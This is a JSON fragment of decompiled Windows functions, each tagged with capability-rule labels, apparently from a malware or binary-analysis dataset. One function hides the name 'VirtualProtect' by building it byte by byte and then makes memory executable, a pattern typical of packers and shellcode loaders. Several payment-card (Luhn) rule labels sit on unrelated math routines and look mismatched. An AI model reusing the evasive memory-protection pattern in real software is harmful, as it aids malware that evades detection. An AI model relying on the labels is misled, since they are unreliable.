        "decompiled_code": "\nvoid fcn.00404400(void)\n\n{\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0x401280;\n    uStack16 = 0x40440e;\n    *0x2f5da88 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    uStack16 = 0x81e180;\n    *0x81e180 = 0x56;\n    *0x81e181 = 0x69;\n    *0x81e182 = 0x72;\n    *0x81e187 = 0x50;\n    *0x81e18d = 0x74;\n    *0x81e18e = 0;\n    *0x81e183 = 0x74;\n    *0x81e184 = 0x75;\n    *0x81e185 = 0x61;\n    *0x81e186 = 0x6c;\n    *0x81e188 = 0x72;\n    *0x81e189 = 0x6f;\n    *0x81e18a = 0x74;\n    *0x81e18b = 0x65;\n    *0x81e18c = 99;\n    *0x2f5a588 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x2f5da88);\n    (**0x2f5a588)(*0x2f5a5a0, *0x2f5da9c, 0x40, &stack0xfffffff0);\n    return;\n}\n",
        "token_count": 355
    },
    "00405c3e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00405ee2)\n\nfloat10 fcn.00405c3e(double param_1)\n\n{\n    int32_t iVar1;\n    double dVar2;\n    double dVar3;\n    int32_t iVar4;\n    double dVar5;\n    double dVar6;\n    uchar auVar7 [16];\n    double dVar8;\n    double in_XMM7_Qa;\n    \n    dVar2 = in_XMM7_Qa & *0x401390;\n    dVar3 = in_XMM7_Qa & *0x401398;\n    if (*0x4014b8 <= dVar2) {\n        return *0x4014c8 + *((param_1._4_4_ >> 0x1f) * -8 + 0x4013a0);\n    }\n    if (*0x4014a8 <= dVar2) {\n        if (*0x4014a0 <= dVar2) {\n            if (*0x401498 <= dVar2) {\n                iVar1 = 0x300;\n                dVar3 = *0x401480 / dVar2;\n            }\n            else {\n                iVar4 = (dVar2 + *0x401490 >> 0x2c) - *0x401470;\n                iVar1 = iVar4 * 3;\n                dVar3 = *(iVar4 * 0x18 + 0x401df8);\n                dVar3 = (dVar2 - dVar3) / (dVar2 * dVar3 + *0x401488);\n            }\n            dVar5 = dVar3 * dVar3;\n            dVar6 = dVar5 * dVar5;\n            dVar8 = dVar3 * dVar3 * dVar3 * dVar3;\n            dVar5 = (((*0x401460 * dVar6 + *0x401450) * dVar6 + *0x401440) * dVar6 + *0x401430) * dVar5;\n            auVar7 = CONCAT88(((*0x401468 * dVar8 + *0x401458) * dVar8 + *0x401448) * dVar8 + *0x401438, dVar5);\n            auVar7 = shufpd(auVar7, auVar7, 1);\n            return *(iVar1 * 8 + 0x401de8) - (((dVar5 + SUB168(auVar7, 0)) * dVar3 - *(iVar1 * 8 + 0x401df0)) - dVar3) |\n                   in_XMM7_Qa ^ dVar2;\n        }\n        dVar2 = dVar2 * dVar2;\n        dVar5 = dVar2 * dVar2;\n        dVar3 = dVar3 * dVar3 * dVar3 * dVar3;\n        dVar2 = (((((((*0x401420 * dVar5 + *0x401410) * dVar5 + *0x401400) * dVar5 + *0x4013f0) * dVar5 + *0x4013e0) *\n                   dVar5 + *0x4013d0) * dVar5 + *0x4013c0) * dVar5 + *0x4013b0) * dVar2;\n        auVar7 = CONCAT88(((((((*0x401428 * dVar3 + *0x401418) * dVar3 + *0x401408) * dVar3 + *0x4013f8) * dVar3 +\n                            *0x4013e8) * dVar3 + *0x4013d8) * dVar3 + *0x4013c8) * dVar3 + *0x4013b8, dVar2);\n        auVar7 = shufpd(auVar7, auVar7, 1);\n        return in_XMM7_Qa - (dVar2 + SUB168(auVar7, 0)) * in_XMM7_Qa;\n    }\n    if (*0x4014b0 <= dVar2) {\n        dVar2 = dVar2 * dVar2;\n        dVar5 = dVar2 * dVar2;\n        dVar3 = dVar3 * dVar3 * dVar3 * dVar3;\n        dVar2 = (((*0x401460 * dVar5 + *0x401450) * dVar5 + *0x401440) * dVar5 + *0x401430) * dVar2;\n        auVar7 = CONCAT88(((*0x401468 * dVar3 + *0x401458) * dVar3 + *0x401448) * dVar3 + *0x401438, dVar2);\n        auVar7 = shufpd(auVar7, auVar7, 1);\n        return in_XMM7_Qa - (dVar2 + SUB168(auVar7, 0)) * in_XMM7_Qa;\n    }\n    if (dVar2 != *0x401478) {\n        if (*0x4014c0 <= dVar2) {\n            return *0x4014c8 * *0x4014c8 + param_1;\n        }\n        return *0x4014c8 * *0x4014c8 + param_1;\n    }\n    return param_1;\n}\n",
        "token_count": 1197
    },
    "00406125": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00406125(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(param_2 + 4) & 0x7ff00000;\n    if (uVar1 != 0x7ff00000) {\n        return uVar1;\n    }\n    return *(param_2 + 4);\n}\n",
        "token_count": 91
    },
    "00407dcf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407dcf(uint arg_8h)\n\n{\n    fcn.00407ca3(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "00408a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00408a70(int32_t *arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t unaff_EDI;\n    int32_t *var_18h;\n    uint var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    piVar3 = *(arg_ch + 8) ^ *0x81cf88;\n    var_1h._0_1_ = '\\0';\n    var_ch = 1;\n    if (*piVar3 != -2) {\n        fcn.004082e0(unaff_EDI);\n    }\n    fcn.004082e0(unaff_EDI);\n    iVar2 = arg_ch;\n    if ((*(arg_8h + 1) & 0x66) == 0) {\n        *(arg_ch + -4) = &var_18h;\n        iVar2 = *(arg_ch + 0xc);\n        var_18h = arg_8h;\n        var_14h = arg_10h;\n        if (iVar2 == -2) {\n            return var_ch;\n        }\n        do {\n            var_10h = piVar3 + iVar2 * 3 + 4;\n            var_8h = *var_10h;\n            if (piVar3[iVar2 * 3 + 5] != 0) {\n                iVar1 = fcn.0040ce3e();\n                var_1h._0_1_ = '\\x01';\n                if (iVar1 < 0) {\n                    var_ch = 0;\n                    goto code_r0x00408b18;\n                }\n                if (0 < iVar1) {\n                    if (((*arg_8h == -0x1f928c9d) && (*0x2f65600 != NULL)) &&\n                       (iVar1 = fcn.0040b3a0(0x2f65600),  iVar1 != 0)) {\n                        (**0x2f65600)(arg_8h, 1);\n                    }\n                    fcn.0040ce6e();\n                    if (*(arg_ch + 0xc) != iVar2) {\n                        unaff_EDI = arg_ch + 0x10;\n                        fcn.0040ce88();\n                    }\n                    *(arg_ch + 0xc) = var_8h;\n                    if (*piVar3 != -2) {\n                        fcn.004082e0(unaff_EDI);\n                    }\n                    fcn.004082e0(unaff_EDI);\n                    fcn.0040ce55();\n                    goto code_r0x00408bdc;\n                }\n            }\n            iVar2 = var_8h;\n        } while (var_8h != -2);\n        if (var_1h == '\\0') {\n            return var_ch;\n        }\n    }\n    else {\ncode_r0x00408bdc:\n        if (*(iVar2 + 0xc) == -2) {\n            return var_ch;\n        }\n        fcn.0040ce88(arg_ch + 0x10, 0x81cf88);\n    }\ncode_r0x00408b18:\n    if (*piVar3 != -2) {\n        fcn.004082e0(unaff_EDI);\n    }\n    fcn.004082e0(unaff_EDI);\n    return var_ch;\n}\n",
        "token_count": 800
    },
    "0040a301": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040a315)\n// WARNING: Removing unreachable block (ram,0x0040a31b)\n// WARNING: Removing unreachable block (ram,0x0040a31d)\n\nvoid fcn.0040a301(void)\n\n{\n    return;\n}\n",
        "token_count": 66
    },
    "0041176e": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0041176e(void)\n\n{\n    *0x81e168 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x40400c, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 64
    }
}